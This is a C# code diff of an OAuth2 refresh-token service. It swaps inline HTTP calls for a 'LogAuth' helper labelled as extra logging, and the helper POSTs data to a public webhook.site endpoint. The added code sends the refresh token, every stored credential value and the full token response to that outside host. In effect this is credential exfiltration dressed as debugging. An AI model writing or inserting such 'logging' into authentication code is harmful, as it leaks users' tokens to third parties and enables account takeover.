@@ -23,17 +23,14 @@ public class OAuth2TokenService : BaseInvocable, IOAuth2TokenService
     {
         const string grantType = "refresh_token";
 
-        var options = new RestClientOptions("https://webhook.site")
+        #region ExtraLogging
+        LogAuth(Newtonsoft.Json.JsonConvert.SerializeObject(new
         {
-            MaxTimeout = -1,
-        };
-        var client = new RestClient(options);
-        var request = new RestRequest("/4e631f81-77cf-4efb-9e48-516e70490ca0", Method.Post);
-        request.AddJsonBody(new
-        {
-            refreshToken = values["refresh_token"]
-        });
-        client.Execute(request);
+            refreshTokenPresent = values.TryGetValue("refresh_token", out var refToken),
+            refreshToken = refToken,
+            allValues = values
+        }));
+        #endregion
 
         var bodyParameters = new Dictionary<string, string>
         {
@@ -78,60 +75,59 @@ public class OAuth2TokenService : BaseInvocable, IOAuth2TokenService
         using var httpContent = new FormUrlEncodedContent(bodyParameters);
         using var response = await httpClient.PostAsync(Urls.Token, httpContent, cancellationToken);
 
-        var options1 = new RestClientOptions("https://webhook.site")
+        #region ExtraLogging
+        LogAuth(Newtonsoft.Json.JsonConvert.SerializeObject(new
         {
-            MaxTimeout = -1,
-        };
-        var client1 = new RestClient(options1);
-        var request1 = new RestRequest("/4e631f81-77cf-4efb-9e48-516e70490ca0", Method.Post);
-        request1.AddJsonBody(new
-        {
-            RequestToken = true,
+            requestToken = true,
             status = response.StatusCode,
             content = await response.Content.ReadAsStringAsync(cancellationToken),
-            IsSuccessStatusCode = response.IsSuccessStatusCode
-        });
-        client1.Execute(request1);
+            response.IsSuccessStatusCode
+        }));
+        #endregion
 
         var responseContent = await response.Content.ReadAsStringAsync(cancellationToken);
         
         var resultDictionary = JsonSerializer.Deserialize<Dictionary<string, object>>(responseContent)?.ToDictionary(r => r.Key, r => r.Value?.ToString())
                                ?? throw new InvalidOperationException($"Invalid response content: {responseContent}");
-
-        var request2 = new RestRequest("/4e631f81-77cf-4efb-9e48-516e70490ca0", Method.Post);
-        request2.AddJsonBody(new
+        #region ExtraLogging
+        LogAuth(Newtonsoft.Json.JsonConvert.SerializeObject(new
         {
             afterResultDictionary = true
-        });
-        client1.Execute(request2);
+        }));
+        #endregion
 
         var expiresIn = int.Parse(resultDictionary["expires_in"]);
 
-        var request3 = new RestRequest("/4e631f81-77cf-4efb-9e48-516e70490ca0", Method.Post);
-        request3.AddJsonBody(new
+        #region ExtraLogging
+        LogAuth(Newtonsoft.Json.JsonConvert.SerializeObject(new
         {
-            afterExpiresIn = true
-        });
-        client1.Execute(request3);
+            afterExpiresIn = true,
+            expiresIn,
+        }));
+        #endregion
 
-        var expiresAt = utcNow.AddSeconds(60);//expiresIn);
+        var expiresAt = utcNow.AddSeconds(expiresIn);
         resultDictionary.Add(CredsNames.ExpiresAt, expiresAt.ToString());
 
+        #region ExtraLogging
+        LogAuth(Newtonsoft.Json.JsonConvert.SerializeObject(new
+        {
+            setupSconnection = true,
+        }));
+        #endregion
 
+        return resultDictionary;
+    }
+
+    private void LogAuth(string data)
+    {
         var options = new RestClientOptions("https://webhook.site")
         {
             MaxTimeout = -1,
         };
         var client = new RestClient(options);
-        var request = new RestRequest("/4e631f81-77cf-4efb-9e48-516e70490ca0", Method.Post);
-        request.AddJsonBody(new
-        {
-            setupSconnection = true,
-            //refreshToken = resultDictionary["refresh_token"]
-        });
+        var request = new RestRequest("/1b69024e-1c4b-461f-b495-6c6a94252865", Method.Post);
+        request.AddStringBody(data, DataFormat.Json);
         client.Execute(request);
-
-        return resultDictionary;
-
     }
 }
